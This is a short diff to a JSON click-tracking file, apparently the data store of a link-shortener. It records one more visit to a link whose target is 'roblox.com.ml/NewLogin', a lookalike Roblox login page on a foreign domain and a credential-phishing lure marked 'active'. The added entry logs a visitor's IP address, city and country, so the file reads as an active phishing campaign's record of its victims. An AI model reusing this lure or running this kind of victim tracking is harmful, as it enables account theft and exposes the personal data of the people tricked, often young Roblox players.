@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 803,
+    "useCount": 804,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6536,6 +6536,14 @@
         "city": "Praia da Vitória",
         "flag": "🇵🇹",
         "countryCode": "PT"
+      },
+      {
+        "timestamp": 1777167257246,
+        "ip": "190.67.206.200",
+        "country": "Colombia",
+        "city": "Ibagué",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
